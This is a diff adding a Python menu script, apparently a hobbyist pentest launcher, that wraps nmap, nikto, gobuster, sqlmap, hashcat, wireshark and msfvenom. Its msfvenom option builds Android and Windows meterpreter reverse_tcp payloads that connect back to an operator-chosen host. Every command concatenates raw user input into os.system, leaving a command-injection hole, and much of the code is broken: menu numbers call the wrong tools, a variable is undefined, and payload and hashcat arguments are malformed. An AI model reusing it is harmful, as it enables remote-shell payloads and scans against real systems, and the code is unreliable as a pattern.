@@ -1,0 +1,169 @@
+ #!/bin/env python
+import os
+os.system("apt-get install figlet")
+os.system("clear")
+os.system("figlet Pentest | lolcat")
+
+print("Producers : Seition2 | AliAltnta")
+print("GitHub = https://github.com/Haydar12345")
+print("TryHackMe = https://tryhackme.com/p/AliAltnta")
+
+print("""
+
+1)English
+
+2)Turkish
+
+
+
+""")
+dil = input("> ")
+if(dil=="1"):
+        os.system("clear")
+        os.system("apt-get install figlet")
+        os.system("clear")
+        os.system("figlet Pentest | lolcat")
+        print("Producers : Seition2 | AliAltnta")
+        print("GitHub = https://github.com/Haydar12345")
+        print("TryHackMe = https://tryhackme.com/p/AliAltnta")
+        print("""   
+                      
+9-Port Scan                   
+
+                              
+8-Scan All Ports              
+ 
+                              
+7-operating system scan       
+
+                              
+6-Nikto Scan                  
+
+                              
+5-Gobuster Scan               
+
+                              
+4-Sqlmap                      
+
+                              
+3-Wireshark                   
+
+                              
+2-Hashcat                     
+
+                              
+1-MSFvenom Payload            
+
+0-exit
+""")
+elif(dil=="2"):
+        os.system("clear")
+        os.system("apt-get install figlet")
+        os.system("clear")
+        os.system("figlet Pentest | lolcat")
+        print("Yapımcılar : Seition2 | AliAltnta")
+        print("GitHub = https://github.com/Haydar12345")
+        print("TryHackMe = https://tryhackme.com/p/AliAltnta")
+        print("""   
+                      
+9-Port Taraması                   
+
+                              
+8-Tum Baglantı Noktalarını Tara              
+ 
+                              
+7-İsletim Sistemi Taramasi      
+
+                              
+6-Nikto Taraması                  
+
+                              
+5-Gobuster Taraması              
+
+                              
+4-Sqlmap                      
+
+                              
+3-Wireshark                   
+
+                              
+2-Hashcat                     
+
+                              
+1-MSFvenom Payload            
+
+0-Cikis
+""") 
+
+islemno = input("enter the transaction number > ")
+
+if(islemno=="9"):
+        hedefip = input("enter the target ip> ")
+        os.system("nmap " + hedefip)
+
+elif(islemno=="8"):
+        hedefip = input("enter the destination url > ")
+        os.system("nikto -h " + hedefip)
+
+elif(islemno=="7"):
+        hedefip = input("enter the target ip > ")
+        os.system("nmap -O " + hedefip)
+
+elif(islemno=="6"):
+    verbose = input("To open Verbose Mode-type vv > ")
+    hedefip = input("enter the target ip > ")
+    os.system("nmap -p- " + hedefip+" "+verbose)
+
+elif(islemno=="5"):
+        hedefurl = input("enter the target ip > ")
+        uzantı = input("enter extensions > ")
+        os.system("gobuster dir -u " + hedefurl +" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x"+uzantı+verbose) 
+
+elif(islemno=="4"):
+        hedefip = input("enter the target ip > ")
+        os.system("sqlmap -u " + hedefip)
+
+elif(islemno=="3"):
+        os.system("wireshark")
+
+elif(islemno=="2"):
+        md5 = input("md5 > ")
+        wordlist = input("wordlist > ")   
+        os.system("sudo hashcat -a 3 -m 0 " + md5 + wordlist + "--force")
+
+elif(islemno=="1"):
+        print("""
+
+2)apk
+
+1)exe
+
+0)exit
+
+        """)
+        islem1 = input("enter the transaction number > ")
+        if(islem1=="2"):
+                LHOST = input("IP > ")
+                LPORT = input("PORT > ")
+                os.system(" msfvenom -p android/meterpreter/reverse_tcp " + LHOST + LPORT + "R > /home/kali/Desktop/shell.apk")
+        elif(islem1=="1"):
+                LHOST = input("IP > ")
+                LPORT = input("PORT > ")
+                os.system(" msfvenom -p windows/meterpreter/reverse_tcp " + LHOST + LPORT + " > /home/kali/Desktop/shell.exe")
+        elif(islem1=="0"):
+                os.system("python3 haydar")
+        else:
+                print("please make sure you enter an accurate value ...")
+
+elif(islemno=="0"):
+
+        sor1 = input("Are You Sure?  yes / no >  ")
+
+        if(sor1=="yes"):
+                os.system("exit")
+
+        if(sor1=="no"):
+                os.system("python3 haydar")
+
+else:
+        print("please make sure you enter an accurate value ...")
